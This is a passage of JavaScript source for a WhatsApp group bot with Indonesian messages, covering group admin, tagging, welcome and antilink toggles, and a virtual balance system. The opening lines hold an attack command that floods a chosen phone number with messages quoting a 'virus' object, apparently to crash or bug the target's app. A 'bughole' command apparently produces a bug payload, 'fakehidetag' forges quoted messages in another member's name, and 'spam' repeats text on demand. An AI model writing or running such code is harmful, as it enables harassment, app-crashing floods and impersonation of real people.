            if (!terern) return reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
            for (let i = 0; i < terern; i++){
            conn.sendMessage(`${spar}@s.whatsapp.net`, { text: "Hi", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: virus})
            }
            let ter = q.split("|")[1]
            reply(`Success Attack Target During Attack ${ter} Minutes`)
            break
            conn.sendMessage(from, { text: "haii?", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: virus})
            break
			case prefix+'group': case prefix+'grup':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
				addCountCmd('#group', sender, _cmd)
				if (args[1] == "close") {
				  conn.groupSettingUpdate(from, 'announcement')
				  reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
				} else if (args[1] == "open") {
				  conn.groupSettingUpdate(from, 'not_announcement')
				  reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
				} else {
				  reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
				}
			    break
			case prefix+'revoke':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				addCountCmd('#revoke', sender, _cmd)
				await conn.groupRevokeInvite(from)
			    .then( res => {
				  reply(`Sukses menyetel tautan undangan grup ini`)
				}).catch(() => reply("Maaf terjadi kesalahan"))
				break
            case prefix+'tagall': case prefix+'infoall':
                   if (!isGroup) return reply(mess.OnlyGrup)
				   if (!isGroupAdmins) return reply(mess.GrupAdmin)
				   addCountCmd('#tagall', sender, _cmd)
				   let participants = msg.isGroup ? await groupMetadata.participants : ''
                   let tekss = `*👤 TAG ALL 👤*\n\n*Pesan : ${q ? q : 'Nothing'}*\n\n`
                   for (let mem of participants) {
                   tekss += `• @${mem.id.split('@')[0]}\n`
                   }
                   tekss += `\nXyzTeam � 2021`
                   conn.sendMessage(from, { text: tekss, mentions: participants.map(a => a.id) }, { quoted: msg })
                   break
			case prefix+'hidetag':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
				addCountCmd('#hidetag', sender, _cmd)
			    let mem = [];
		        groupMembers.map( i => mem.push(i.id) )
				conn.sendMessage(from, { text: q ? q : '', mentions: mem })
			    break
            case prefix+'fakehidetag':
                   if (!isPremium) return reply(mess.OnlyPrem)
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (args.length < 2) return reply(`Kirim perintah *${command}* @tag|teks`)
                   var org = q.split("|")[0]
                   var teks = q.split("|")[1];
                   if (!org.startsWith('@')) return reply('Tag orangnya')
                   var mem2 = []
                   groupMembers.map( i => mem2.push(i.id) )
                   var mens = parseMention(org)
                   addCountCmd('#fakehidetag', sender, _cmd)
                   var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${prefix}hidetag ${teks}`, contextInfo: { mentionedJid: mens }}}}
                   var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${prefix}hidetag ${teks}` }}
                   conn.sendMessage(from, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
                   break
                        case prefix+'welcome':
                            if (!isGroup) return reply(mess.OnlyGrup)
                            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                            if (args.length < 2) return reply(`Pilih enable atau disable`)
                            if (args[1].toLowerCase() === "enable") {
                              if (isWelcome) return reply(`Welcome sudah aktif`)
                              addCountCmd('#welcome', sender, _cmd)
                              welcome.push(from)
                              fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                              reply(`Sukses mengaktifkan welcome di grup ini`)
                            } else if (args[1].toLowerCase() === "disable") {
                              if (!isWelcome) return reply(`Welcome sudah nonaktif`)
                              addCountCmd('#welcome', sender, _cmd)
                              var posi = welcome.indexOf(from)
                              welcome.splice(posi, 1)
                              fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                              reply(`Sukses menonaktifkan welcome di grup ini`)
                            } else {
                              reply(`Pilih enable atau disable`)
                            }
                            break
                            case prefix+'antilink':
                            if (!isGroup) return reply(mess.OnlyGrup)
                            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
                            if (args.length < 2) return reply(`Pilih enable atau disable`)
                            if (args[1].toLowerCase() === "enable") {
                              if (isAntilink) return reply(`Antilink sudah aktif`)
                              addCountCmd('#antilink', sender, _cmd)
                              antilink.push(from)
                              fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                              reply(`Sukses mengaktifkan welcome di grup ini`)
                            } else if (args[1].toLowerCase() === "disable") {
                              if (!isAntilink) return reply(`Antilink sudah nonaktif`)
                              addCountCmd('#antilink', sender, _cmd)
                              var posi = antilink.indexOf(from)
                              antilink.splice(posi, 1)
                              fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                              reply(`Sukses menonaktifkan antilink di grup ini`)
                            } else {
                              reply(`Pilih enable atau disable`)
                            }
                            break
			// Bank & Payment Menu
			case prefix+'topbalance':{
				addCountCmd('#topbalance', sender, _cmd)
                balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
                let top = '*── 「 TOP BALANCE 」 ──*\n\n'
                let arrTop = []
				var total = 10
				if (balance.length < 10) total = balance.length
                for (let i = 0; i < total; i ++){
                    top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
                    arrTop.push(balance[i].id)
                }
                mentions(top, arrTop, true)
            }
                break
            case prefix+'buylimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                addCountCmd('#buylimit', sender, _cmd)
                kurangBalance(sender, ane, balance)
                giveLimit(sender, parseInt(args[1]), limit)
                reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
            }
                break
			case prefix+'transfer':
            case prefix+'tf':{
                 if (args.length < 2) return reply(`Kirim perintah *${command}* @tag nominal\nContoh : ${command} @0 2000`)
                 if (mentioned.length == 0) return reply(`Tag orang yang ingin di transfer balance`)
                 if (!args[2]) return reply(`Masukkan nominal nya!`)
                 if (isNaN(args[2])) return reply(`Nominal harus berupa angka!`)
                 if (args[2].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                 if (args[2].includes("-")) return reply(`Jangan menggunakan -`)
                 var anu = getBalance(sender, balance)
                 if (anu < args[2] || anu == 'undefined') return reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[2]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
                 addCountCmd('#transfer', sender, _cmd)
                 kurangBalance(sender, parseInt(args[2]), balance)
                 addBalance(mentioned[0], parseInt(args[2]), balance)
                 reply(`Sukses transfer balance sebesar $${args[2]} kepada @${mentioned[0].split("@")[0]}`)
            }
                 break
            case prefix+'buygamelimit':
            case prefix+'buyglimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buyglimit* jumlah game limit yang ingin dibeli\n\nHarga 1 game limit = $150 balance\nPajak $1 / $10`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                addCountCmd('#buyglimit', sender, _cmd)
                kurangBalance(sender, ane, balance)
                givegame(sender, parseInt(args[1]), glimit)
                reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
            }
                break
			case prefix+'limit': case prefix+'balance':
			case prefix+'ceklimit': case prefix+'cekbalance':
			    addCountCmd('#limit', sender, _cmd)
			    if (mentioned.length !== 0){
					var Ystatus = ownerNumber.includes(mentioned[0])
					var isPrim = Ystatus ? true : _prem.checkPremiumUser(mentioned[0], premium)
				    var ggcount = isPrim ? gcounti.prem : gcounti.user
                    var limitMen = `${getLimit(mentioned[0], limitCount, limit)}`
                    textImg(`Limit : ${_prem.checkPremiumUser(mentioned[0], premium) ? 'Unlimited' : limitMen}/${limitCount}\nLimit Game : ${cekGLimit(mentioned[0], ggcount, glimit)}/${ggcount}\nBalance : $${getBalance(mentioned[0], balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                } else {
                    var limitPrib = `${getLimit(sender, limitCount, limit)}/${limitCount}`
                    textImg(`Limit : ${isPremium ? 'Unlimited' : limitPrib}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                }
				break
            // Fun menu
            case prefix+'spam':
            addCountCmd('#spam', sender, _cmd)
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!q) return reply("Contoh Pengunaan : \n\n.spam sayang|10")
            let txtz = q.split("|")[0]
            let count = q.split("|")[1]
if (isNaN(count)) return reply(`Harus nomor, kocak`)
if (Number(count) >= 111) throw reply('Kebanyakan')
for (let i = 0; i < count; i++){
	reply(txtz)
	}
	break
            case prefix+'bughole':
            addCountCmd('#bughole', sender, _cmd)
            if (!isOwner) return reply("Owner Only")
            let bro = bughole(sender)
            reply(bro)
            break
			default:
		    
		}
	} catch (err) {
		console.log(color('[ERROR]', 'red'), err)
	}
}
